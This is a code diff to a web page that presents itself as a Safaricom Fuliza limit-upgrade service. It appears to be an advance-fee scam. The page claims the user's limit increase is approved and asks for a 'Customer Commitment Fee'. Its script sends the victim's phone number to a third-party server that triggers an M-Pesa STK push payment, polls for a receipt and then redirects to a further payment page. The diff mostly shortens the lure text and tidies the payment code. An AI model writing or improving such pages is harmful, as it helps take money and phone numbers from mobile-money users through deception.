@@ -74,8 +74,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
   </div>
 
   <div class="instructions">
-    <p>Dear Customer, your Fuliza limit increase request has been approved. To finalize the upgrade, please complete the <strong>Customer Commitment Fee</strong> below. This confirms your request and allows our system to <strong>automatically refresh your current limit to the new limit you selected</strong>.</p>
-    <p>Complete this step to proceed to the <strong>final Fuliza limit activation stage</strong>. Once completed, your upgraded limit will be processed immediately.</p>
+    <p>Complete the <strong>Customer Commitment Fee</strong> to finalize your limit upgrade. Once payment is successful, your new Fuliza limit will be activated immediately.</p>
   </div>
 
   <div class="pay-section">
@@ -88,7 +87,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
 
     <div class="spinner" id="spinner">
       <div class="loader"></div>
-      <div class="spinner-text" id="spinnerText">Sending STK Push to your phone…</div>
+      <div class="spinner-text">Sending STK Push…</div>
     </div>
 
     <div class="status-msg" id="statusMsg"></div>
@@ -113,65 +112,65 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
 </div>
 
 <script>
-const BACKEND = "https://mpayafrica-server.onrender.com";
-const selectedAmount = localStorage.getItem("selectedAmount") || "—";
-document.getElementById("limit").innerText = selectedAmount;
-
-const COMMITMENT_FEE = 14; // or 1000?
+const BACKEND = "https://mpayafrica-server.onrender.com"; // your server.js backend
+const COMMITMENT_FEE = 14;
 
 const phoneInput = document.getElementById("phone");
 const phoneWrap = document.getElementById("phoneWrap");
 const statusMsg = document.getElementById("statusMsg");
 const spinner = document.getElementById("spinner");
+const payBtn = document.getElementById("payBtn");
 
-phoneInput.addEventListener("input", () => {
-  phoneInput.value = phoneInput.value.replace(/\D/g, "").slice(0, 9);
-  validatePhone(phoneInput.value);
-});
+document.getElementById("limit").innerText = localStorage.getItem("selectedAmount") || "—";
 
-function validatePhone(val) {
-  if(val.length === 9 && val.startsWith("7")) {
-    phoneWrap.className = "phone-wrap valid";
+function validatePhone(val){
+  if(val.length===9 && val.startsWith("7")){
+    phoneWrap.className="phone-wrap valid";
     return true;
   }
   phoneWrap.className = val.length ? "phone-wrap invalid" : "phone-wrap";
   return false;
 }
 
-async function payNow() {
-  const digits = phoneInput.value.trim();
-  if(!validatePhone(digits)){
+phoneInput.addEventListener("input", ()=>{
+  phoneInput.value = phoneInput.value.replace(/\D/g,"").slice(0,9);
+  validatePhone(phoneInput.value);
+});
+
+async function payNow(){
+  const val = phoneInput.value.trim();
+  if(!validatePhone(val)){
     statusMsg.style.display="block";
     statusMsg.className="status-msg error";
     statusMsg.innerText="Enter valid Safaricom number starting with 7";
     return;
   }
-  const fullPhone = "254" + digits;
-  spinner.style.display = "flex";
-  statusMsg.style.display = "none";
-  phoneInput.disabled = true;
-  document.getElementById("payBtn").disabled = true;
+  const fullPhone = "254"+val;
+  spinner.style.display="flex";
+  statusMsg.style.display="none";
+  phoneInput.disabled=true;
+  payBtn.disabled=true;
 
   let data;
-  try {
-    const res = await fetch(BACKEND + "/api/stk-push", {
-      method: "POST",
-      headers: {"Content-Type":"application/json"},
-      body: JSON.stringify({
+  try{
+    const res = await fetch(`${BACKEND}/api/stk-push`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({
         amount: COMMITMENT_FEE,
         phone_number: fullPhone,
-        user_reference: "Fuliza Commitment Fee",
-        payment_id: "commitment_fee"
+        user_reference:"Commitment Fee",
+        payment_id:"commitment_fee"
       })
     });
     data = await res.json();
-  } catch(err){
+  } catch(e){
     spinner.style.display="none";
     statusMsg.style.display="block";
     statusMsg.className="status-msg error";
-    statusMsg.innerText="Network error. Try again.";
-    phoneInput.disabled = false;
-    document.getElementById("payBtn").disabled = false;
+    statusMsg.innerText="Server error. Try again.";
+    phoneInput.disabled=false;
+    payBtn.disabled=false;
     return;
   }
 
@@ -179,51 +178,53 @@ async function payNow() {
     spinner.style.display="none";
     statusMsg.style.display="block";
     statusMsg.className="status-msg error";
-    statusMsg.innerText=data.message||"Payment initiation failed.";
-    phoneInput.disabled = false;
-    document.getElementById("payBtn").disabled = false;
+    statusMsg.innerText=data.message||"Payment initiation failed";
+    phoneInput.disabled=false;
+    payBtn.disabled=false;
     return;
   }
 
-  pollStatus(data.checkoutRequestId, fullPhone);
+  pollStatus(data.checkoutRequestId);
 }
 
-function pollStatus(checkoutId, phone){
-  let attempts = 0;
+function pollStatus(checkoutRequestId){
+  let attempts=0;
   const interval = setInterval(async ()=>{
     attempts++;
-    if(attempts>40){
+    if(attempts>40){ // 2 min timeout at 3s interval
       clearInterval(interval);
       spinner.style.display="none";
       statusMsg.style.display="block";
       statusMsg.className="status-msg error";
       statusMsg.innerText="Payment timeout. Please retry.";
-      phoneInput.disabled = false;
-      document.getElementById("payBtn").disabled = false;
+      phoneInput.disabled=false;
+      payBtn.disabled=false;
       return;
     }
     try{
-      const res = await fetch(`${BACKEND}/receipt/${checkoutId}`);
+      const res = await fetch(`${BACKEND}/receipt/${checkoutRequestId}`);
       const data = await res.json();
-      if(data.status === "success"){
+      if(data.status==="success"){
         clearInterval(interval);
         spinner.style.display="none";
         document.getElementById("successOverlay").classList.add("show");
       }
-      if(data.status === "failed"){
+      if(data.status==="failed"){
         clearInterval(interval);
         spinner.style.display="none";
         statusMsg.style.display="block";
         statusMsg.className="status-msg error";
-        statusMsg.innerText = data.reason || "Payment failed.";
-        phoneInput.disabled = false;
-        document.getElementById("payBtn").disabled = false;
+        statusMsg.innerText=data.reason||"Payment failed";
+        phoneInput.disabled=false;
+        payBtn.disabled=false;
       }
     } catch(e){}
-  }, 3000);
+  },3000);
 }
 
-function goNext(){ window.location.href="payment4.html"; }
+function goNext(){
+  window.location.href="payment4.html";
+}
 </script>
 
 </body>
